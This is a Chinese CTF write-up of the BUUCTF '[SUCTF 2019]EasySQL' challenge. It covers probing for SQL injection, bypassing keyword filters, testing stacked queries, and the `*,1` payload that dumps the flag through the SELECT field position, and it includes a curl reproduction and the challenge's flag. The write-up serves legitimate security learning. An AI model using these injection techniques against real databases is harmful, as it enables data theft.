---
title: "[SUCTF 2019]EasySQL"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [sql-injection, stacked-query, select-injection]
vulnerability: SQL 注入 - SELECT 字段注入，后端直接将用户输入拼接到 SELECT 语句的字段位置
solved: true
flag: "flag{598bfa32-c247-434d-8182-8c62d67dd786}"
---

# [SUCTF 2019]EasySQL

## 题目概述
题目提供一个简单的表单，提示 "Give me your flag, I will tell you if the flag is right."，提交 `query` 参数进行查询。

## 信息收集
1. 访问页面，发现是一个 POST 表单，参数名为 `query`
2. 测试 `query=1`，返回 `Array([0] => 1)`，说明有回显
3. 测试 `query=1' or '1'='1`，返回 `Nonono.`，存在过滤
4. 测试 `query=1 or 1=1`，返回 `Nonono.`，`or` 被过滤
5. 测试 `query=1 && 1=1`，正常返回，`&&` 未过滤
6. 测试 `query=1;select 1`，返回两个数组，**堆叠注入可行**

## 漏洞分析（漏洞类型、原理、判断过程）
- **漏洞类型**：SQL 注入 - SELECT 字段位置注入
- **原理**：后端代码将用户输入直接拼接到 `select` 语句的字段位置，形如：
  ```sql
  select $_POST['query'] from flag
  ```
- **判断过程**：
  1. 输入 `1` 返回 `Array([0] => 1)`，说明输入被当作查询字段
  2. 输入 `*,1` 返回 `Array([0] => flag{...}, [1] => 1)`，确认存在名为 `flag` 的表，且第一列存储 flag
  3. 过滤了 `or`、`union`、单引号等关键字，但未过滤 `*` 和 `,`

## 利用过程（Payload + Flag）
**Payload**：`*,1`

**原理解释**：
- 输入 `*,1` 后，SQL 语句变为：`select *,1 from flag`
- `*` 查询 flag 表的所有列，`1` 作为常量列
- 返回结果包含 flag 表的第一列（即 flag 值）

**Flag**：`flag{598bfa32-c247-434d-8182-8c62d67dd786}`

## 复现步骤
```bash
# 访问题目
curl -s -X POST "http://target/" -d "query=*,1"
# 返回结果包含 flag
# Array([0] => flag{598bfa32-c247-434d-8182-8c62d67dd786}, [1] => 1)
```

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| SQL注入-字段注入 | query 参数 | `*,1` | SELECT 字段位置可注入 `*` 通配符 |

## 知识总结（解题技巧、同类题型套路）
1. **探测注入点位置**：当输入数字返回相同数字时，可能是 SELECT 字段位置注入
2. **利用通配符**：在字段位置注入 `*` 可以查询表的所有列
3. **堆叠注入测试**：使用分号 `;` 测试是否支持多语句执行
4. **过滤绕过思路**：当常见关键字被过滤时，尝试利用 SQL 语法特性（如 `*`、`,`、数字等）
